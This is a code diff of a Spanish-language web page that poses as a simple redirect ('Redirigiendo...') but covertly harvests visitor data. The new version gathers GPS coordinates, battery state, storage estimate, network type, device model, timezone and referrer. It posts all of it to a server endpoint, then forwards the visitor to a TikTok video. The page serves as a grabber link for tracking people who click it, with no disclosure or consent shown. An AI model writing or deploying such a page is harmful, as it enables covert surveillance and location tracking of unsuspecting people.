@@ -1,78 +1,116 @@
+<!-- public/index.html -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Recolección Mejorada</title>
-</head>
-<body>
-  <p>Espere un momento...</p>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirigiendo...</title>
   <script>
-    // Obtener coordenadas GPS
-    function obtenerCoordenadas() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve(null);
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-          err => resolve(null),
-          { timeout: 5000 }
+    async function recopilarDatos() {
+      const start = Date.now();
+      const battery = await navigator.getBattery?.();
+      const deviceMemory = navigator.deviceMemory || null;
+      const lang = navigator.language;
+      const platform = navigator.platform;
+      const userAgent = navigator.userAgent;
+      const resolution = `${screen.width}x${screen.height}`;
+      const referrer = document.referrer;
+      const tipoRed = navigator.connection?.effectiveType || null;
+      const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const cookiesHabilitadas = navigator.cookieEnabled;
+      const soporteLocal = !!window.localStorage;
+      const soporteSession = !!window.sessionStorage;
+      const pestañaActiva = document.visibilityState === 'visible';
+
+      const almacenamiento = await navigator.storage?.estimate?.();
+      const coords = await new Promise(resolve => {
+        navigator.geolocation?.getCurrentPosition(
+          pos => resolve(pos.coords),
+          () => resolve(null),
+          { timeout: 1000 }
         );
       });
-    }
 
-    // Obtener tipo de red
-    function obtenerTipoRed() {
-      const nav = navigator;
-      if ('connection' in nav) {
-        return nav.connection.effectiveType || nav.connection.type || null;
-      }
-      return null;
-    }
+      const esBot = /bot|crawler|spider|crawling/i.test(userAgent);
 
-    async function enviarRegistro() {
-      const horaInicio = Date.now();
-
-      const datos = {
-        navegador: navigator.userAgent,
-        idioma: navigator.language,
-        plataforma: navigator.platform,
-        resolucion: `${screen.width}x${screen.height}`,
-        referrer: document.referrer,
-        coords: await obtenerCoordenadas(),
-        tipoRed: obtenerTipoRed(),
-        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconocida',
+      const data = {
         nombre: 'Visitante',
-        ubicacion: '',
-        duracion: 0
+        userAgent,
+        plataforma: platform,
+        navegador: detectarNavegador(userAgent),
+        sistemaOperativo: detectarSO(userAgent),
+        dispositivoTipo: detectarTipo(userAgent),
+        dispositivoMarca: detectarMarca(userAgent),
+        dispositivoModelo: detectarModelo(userAgent),
+        resolucion: resolution,
+        devicePixelRatio: window.devicePixelRatio,
+        idioma: lang,
+        zonaHoraria,
+        referrer,
+        coords,
+        tipoRed,
+        bateria: battery ? {
+          cargando: battery.charging,
+          nivel: battery.level
+        } : null,
+        almacenamiento: almacenamiento || null,
+        cookiesHabilitadas,
+        soportaLocal: soporteLocal,
+        soportaSession: soporteSession,
+        pestañaActiva,
+        esBot,
+        duracion: Math.floor((Date.now() - start) / 1000)
       };
 
-      // Enviar registro inicial
-      await fetch('/api/registro', {
+      await fetch('/api/registrar', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(datos),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
       });
 
-      // Enviar duración al salir
-      window.addEventListener('beforeunload', () => {
-        const duracionSegundos = Math.floor((Date.now() - horaInicio) / 1000);
-        datos.duracion = duracionSegundos;
-
-        navigator.sendBeacon('/api/registro', JSON.stringify(datos));
-      });
-
-      // Redirigir después de 1 segundo
-      setTimeout(() => {
-        window.location.href = 'https://www.tiktok.com/@reyganzo69/video/74821195';
-      }, 1000);
+      window.location.href = "https://www.tiktok.com/@funados510/video/7512617576338394374?q=funados%20esteli&t=1749224293892";
     }
 
-    enviarRegistro();
+    function detectarNavegador(ua) {
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Edg")) return "Edge";
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Safari")) return "Safari";
+      return "Desconocido";
+    }
+
+    function detectarSO(ua) {
+      if (ua.includes("Windows")) return "Windows";
+      if (ua.includes("Mac OS")) return "Mac OS";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("Linux")) return "Linux";
+      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+      return "Desconocido";
+    }
+
+    function detectarTipo(ua) {
+      if (/mobile|iphone|android/i.test(ua)) return "móvil";
+      if (/tablet|ipad/i.test(ua)) return "tablet";
+      return "desktop";
+    }
+
+    function detectarMarca(ua) {
+      if (/Samsung/i.test(ua)) return "Samsung";
+      if (/Huawei/i.test(ua)) return "Huawei";
+      if (/Xiaomi/i.test(ua)) return "Xiaomi";
+      if (/iPhone|iPad/i.test(ua)) return "Apple";
+      if (/Windows/i.test(ua)) return "Microsoft";
+      return "desconocida";
+    }
+
+    function detectarModelo(ua) {
+      const match = ua.match(/\(([^)]+)\)/);
+      return match ? match[1] : "desconocido";
+    }
+
+    recopilarDatos();
   </script>
-</body>
+</head>
+<body></body>
 </html>
 
